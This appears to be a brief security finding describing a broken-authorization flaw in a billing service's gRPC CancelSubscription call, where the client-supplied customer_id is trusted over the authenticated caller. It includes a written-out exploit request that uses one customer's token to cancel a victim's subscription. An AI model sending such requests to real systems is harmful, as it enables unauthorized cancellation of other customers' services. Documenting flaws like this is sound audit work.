diagnosis: The gRPC CancelSubscription RPC trusts the customer_id field specified in the protobuf request payload rather than reading the authenticated customer identifier from the gRPC context interceptor. A rogue API client can cancel recurring subscriptions and disrupt services for arbitrary customers by specifying victim customer IDs.
exploit_request:
GRPC /billing.v1.BillingService/CancelSubscription
Host: rpc.payments.cloud.net:443
Metadata: authorization: Bearer token_customer_active
Content-Type: application/grpc

{"customer_id": "cust_victim_8812", "subscription_id": "sub_active_4401"}
